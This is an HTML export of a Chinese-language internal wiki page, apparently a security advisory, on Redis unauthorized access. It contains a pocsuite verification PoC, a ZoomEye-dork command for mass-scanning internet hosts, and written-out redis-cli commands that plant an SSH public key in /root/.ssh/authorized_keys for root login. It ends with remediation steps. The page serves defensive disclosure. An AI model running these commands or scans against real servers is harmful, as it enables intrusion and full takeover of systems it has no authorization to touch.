@@ -1,0 +1,150 @@
+                    
+    
+                    
+    
+                    
+    
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>查看源</title>
+        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
+        <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<!--[if lt IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/259297d032f6c2eb68bc8778db0e9ca5/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
+<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">
+
+    </head>
+
+    <body class="mceContentBody aui-theme-default wiki-content fullsize">
+        <p>&nbsp;</p>         <h1><span>一. 漏洞简介</span></h1><p><span style="color: rgb(26,26,26);"><span>漏洞描述：</span></span>Redis因配置不当可以未授权访问，被攻击者恶意利用。攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据。</p><p>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><p><br /></p><p><span style="color: rgb(26,26,26);"><span>漏洞评级：严重</span></span></p><p><br /></p><p><span style="color: rgb(38,38,38);"><span>参考连接：</span></span></p><p>1. <a href="http://www.sebug.net/vuldb/ssvid-89339">http://www.sebug.net/vuldb/ssvid-89339</a></p><p>2. <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p><p>3.<a href="http://www.secpulse.com/archives/5366.html"> http://www.secpulse.com/archives/5366.html</a></p><p>4.<a href="http://www.sebug.net/vuldb/ssvid-89715">http://www.sebug.net/vuldb/ssvid-89715</a></p><p><br /></p><h1>二. 利用条件</h1><p>1） SSH免密码登录，Linux下可以设置SSH免密码登录，方法为使用&quot;公私钥&quot;认证，即首先在客户端上创建一对公私钥 （公钥文件：~/.ssh/id_rsa.pub； 私钥文件：~/.ssh/id_rsa）。然后把公钥放到服务器上（~/.ssh/authorized_keys）, 自己保留好私钥.在使用ssh登录时,ssh程序会发送私钥去和服务器上的公钥做匹配.如果匹配成功就可以登录了。详细可参考（<a href="http://jingyan.baidu.com/article/2fb0ba4043124a00f2ec5f0f.html">http://jingyan.baidu.com/article/2fb0ba4043124a00f2ec5f0f.html </a>）SSH免密码登陆远程服务器</p><p>2） Redis可通过Redis-CLI远程管理，设置Redis的默认路径以及数据库缓存文件。</p><p>方法如下：</p><pre class="prettyprint lang-bash prettyprinted"><span class="pln" style="color: rgb(72,72,76);">config </span><span class="kwd" style="color: rgb(30,52,123);">set</span><span class="pln" style="color: rgb(72,72,76);"> dir </span><span class="pun" style="color: rgb(147,161,161);">/</span><span class="pln" style="color: rgb(72,72,76);">xxx </span></pre><pre class="prettyprint lang-bash prettyprinted"><span class="pln" style="color: rgb(72,72,76);">config </span><span class="kwd" style="color: rgb(30,52,123);">set</span><span class="pln" style="color: rgb(72,72,76);"> dbfilename xxxx</span></pre><pre class="prettyprint lang-bash prettyprinted">set<span class="pln" style="color: rgb(72,72,76);"> xxxx </span><span class="str" style="color: rgb(221,17,68);">&quot;xxx&quot;</span><span class="pln" style="color: rgb(72,72,76);"> </span></pre><pre class="prettyprint lang-bash prettyprinted"><span class="pln" style="color: rgb(72,72,76);">save</span></pre><p>上述两种常见的运维方法结合，在以下条件下：</p><pre class="prettyprint lang-html prettyprinted"><span class="pln" style="color: rgb(72,72,76);">1.Redis服务使用ROOT账号启动  </span></pre><pre class="prettyprint lang-html prettyprinted"><span class="pln" style="color: rgb(72,72,76);">2.Redis服务无密码认证或者使用的是弱口令进行认证 </span></pre><pre class="prettyprint lang-html prettyprinted"><span class="pln" style="color: rgb(72,72,76);">3.服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</span></pre><p><br /></p><h1>三. 漏洞验证</h1><p>使用pocsuite编写验证脚本</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="50d1a394-f4ab-456e-9457-86ba7eb6a8c2" data-macro-parameters="collapse=true|linenumbers=true" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGluZW51bWJlcnM9dHJ1ZXxjb2xsYXBzZT10cnVlfQ&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
+#命令行
+from pocsuite import pocsuite_cli
+#验证模块
+from pocsuite import pocsuite_verify
+#攻击模块
+from pocsuite import pocsuite_attack
+#控制台模式
+from pocsuite import pocsuite_console
+from pocsuite.api.request import req 
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
+
+class RedisPOC(POCBase):
+    vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1' #默认为1
+    vulDate = '2017-02-21' #漏洞公开的时间,不知道就写今天
+
+    author = 'ly55521' #  PoC作者的大名
+    createDate = '2017-02-21'# 编写 PoC 的日期
+    updateDate = '2017-02-21'# PoC 更新的时间,默认和编写时间一样
+    references = ['http://0535code.com/article/20161124_1251.shtml']# 漏洞地址来源,0day不用写
+    name = 'redis Unauthorized access'# PoC 名称
+    appPowerLink = 'https://www.redis.io/'# 漏洞厂商主页地址
+    appName = 'redis'# 漏洞应用名称
+    appVersion = 'all versions'# 漏洞影响版本
+    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        redis未授权漏洞,可以getshell；分为3种方式getshell
+    ''' # 漏洞简要描述
+    samples = []# 测试样列,就是用 PoC 测试成功的网站
+    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+
+
+    #验证漏洞 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
+    def _verify(self):
+        #定义返回结果
+        result = {}
+        #获取漏洞url
+        vul_url = '%s' % self.url
+
+        #如果设置端口则取端口,没有设置则为默认端口
+        import re
+        from pocsuite.lib.utils.funs import url2ip
+        _port = re.findall(':(\d+)\s*', vul_url)
+        if len(_port) != 0:
+            _host = url2ip(vul_url)[0]
+            _port = url2ip(vul_url)[1]
+        else :
+            _host = url2ip(vul_url)
+            _port = 6379
+
+        import socket
+        payload = '\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
+        s = socket.socket()
+        socket.setdefaulttimeout(1)
+        #检测漏洞
+        try:
+            s.connect((_host, _port))
+            s.send(payload)
+            recvdata = s.recv(1024)
+            #print recvdata
+            if recvdata and 'redis_version' in recvdata:
+                #print u'\n【警告】' + host + "【存在未授权访问】"
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = host
+                result['VerifyInfo']['Payload'] = payload
+            else:
+                #print u'\n【不存在漏洞】 ' + host
+                pass
+        except:
+            # return host
+            pass
+        s.close()
+        return self.save_output(result)
+
+    #漏洞攻击
+    def _attack(self):
+        result = {}
+        # 攻击代码
+        return self._verify()
+
+    def save_output(self, result):
+        #判断有无结果并输出
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+register(RedisPOC)
+"""
+PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
+
+使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md
+
+集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md
+
+
+钟馗之眼 批量验证
+pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
+
+
+pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
+
+"""</pre></td></tr></table><p>运行结果如下：</p><p><img class="confluence-embedded-image" src="/download/attachments/45551672/image2017-12-8_18-31-36.png?version=1&amp;modificationDate=1512729097000&amp;api=v2" data-image-src="/download/attachments/45551672/image2017-12-8_18-31-36.png?version=1&amp;modificationDate=1512729097000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="45551833" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2017-12-8_18-31-36.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="45551672" data-linked-resource-container-version="3" title="网络安全部公共空间 > redis未授权访问漏洞 > image2017-12-8_18-31-36.png" data-location="网络安全部公共空间 > redis未授权访问漏洞 > image2017-12-8_18-31-36.png" data-image-height="657" data-image-width="830"></p><h1>四. 漏洞利用</h1><p><span style="color: rgb(88,88,88);">1、<span style="color: rgb(88,88,88);">数据库数据泄露</span></span></p><p><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);">Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。</span></span></p><p><span style="color: rgb(88,88,88);"><img class="confluence-embedded-image confluence-external-resource" src="http://image.3001.net/images/20151111/14472375572367.png" data-image-src="http://image.3001.net/images/20151111/14472375572367.png"><br /></span></p><p><span style="color: rgb(88,88,88);">2、<span style="color: rgb(88,88,88);">代码执行</span></span></p><p><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);">Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下</span></span></p><p><span style="color: rgb(88,88,88);"><img class="confluence-embedded-image confluence-external-resource" src="http://image.3001.net/images/20151111/14472375951085.jpg!small" data-image-src="http://image.3001.net/images/20151111/14472375951085.jpg!small"></span></p><p><span style="color: rgb(88,88,88);">3、<span style="color: rgb(88,88,88);">敏感信息泄露</span></span></p><p><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);">通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。</span></span></span></p><p><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);"><img class="confluence-embedded-image confluence-external-resource" src="http://image.3001.net/images/20151111/14472376693541.png!small" data-image-src="http://image.3001.net/images/20151111/14472376693541.png!small"><br /></span></span></p><p><span style="color: rgb(88,88,88);">4、写入webshell访问服务器</span></p><p><span style="color: rgb(88,88,88);"><span style="color: rgb(88,88,88);">通过redis-clis远程连接到目标redis服务器，执行以下命令：</span><br /></span></p><p><img class="confluence-embedded-image confluence-external-resource" src="http://0535code.com/wp-content/uploads/2016/11/redis-getshell-2.png" data-image-src="http://0535code.com/wp-content/uploads/2016/11/redis-getshell-2.png"></p><p>菜刀远程连接</p><p><img class="confluence-embedded-image confluence-external-resource" src="http://0535code.com/wp-content/uploads/2016/11/redis-caidao.png" data-image-src="http://0535code.com/wp-content/uploads/2016/11/redis-caidao.png"></p><p>5、向服务器中写入公钥可无密码直接登录root</p><p><span style="color: rgb(88,88,88);">首先在本地生成一对密钥：</span></p><p><img class="confluence-embedded-image confluence-external-resource" src="http://image.3001.net/images/20151110/14471647196382.png!small" data-image-src="http://image.3001.net/images/20151110/14471647196382.png!small"></p><p><span style="color: rgb(88,88,88);">然后通过redis-clis远程连接到目标redis服务器，执行以下命令：</span></p><p><br /></p><pre class="prettyprint lang-bash prettyprinted"><span class="pln" style="color: rgb(72,72,76);">config </span><span class="kwd" style="color: rgb(30,52,123);">set</span><span class="pln" style="color: rgb(72,72,76);"> dir </span><span class="pun" style="color: rgb(147,161,161);">/</span><span class="pln" style="color: rgb(72,72,76);">root</span><span class="pun" style="color: rgb(147,161,161);">/.</span><span class="pln" style="color: rgb(72,72,76);">ssh</span><span class="pun" style="color: rgb(147,161,161);">/</span><span class="pln" style="color: rgb(72,72,76);"> </span></pre><pre class="prettyprint lang-bash prettyprinted"><span class="pln" style="color: rgb(72,72,76);">config </span><span class="kwd" style="color: rgb(30,52,123);">set</span><span class="pln" style="color: rgb(72,72,76);"> dbfilename authorized_keys</span></pre><p><span style="color: rgb(88,88,88);">set xxxx &quot;\n\n\nssh-rsa key_pub\n\n\n&quot;，其中key_pub为上图生成的公钥，即可将公钥保存在远端服务器，使得登录时不需要输入账号与密码。</span></p><h1>五. 解决方案</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);">1、指定redis服务使用的网卡 （需要重启redis才能生效）</span><br /><span style="color: rgb(26,26,26);">在 redis.conf 文件中找到 # bind 127.0.0.1 ，把前面的#号去掉，然后保存。注：修改后只有本机才能访问Redis。</span><br /><span style="color: rgb(26,26,26);">2、设置访问密码 （需要重启redis才能生效）</span><br /><span style="color: rgb(26,26,26);">在 redis.conf 中找到requirepass字段，在后面填上你需要的密码，Redis客户端也需要使用此密码来访问Redis服务。</span><br /><span style="color: rgb(26,26,26);">3、修改Redis服务运行账号 （需要重启redis才能生效）</span><br /><span style="color: rgb(26,26,26);">请以较低权限账号运行Redis服务，且禁用该账号的登录权限。另外可以限制攻击者往敏感写入文件，但是Redis数据还是能被黑客访问到，或者被黑客恶意删除。</span><br /><span style="color: rgb(26,26,26);">4、设置防火墙策略</span><br /><span style="color: rgb(26,26,26);">如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务</span></pre><pre class="prettyprint lang-html prettyprinted"><br /></pre><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p>
+        <p>&nbsp;</p>
+    </body>
+</html>
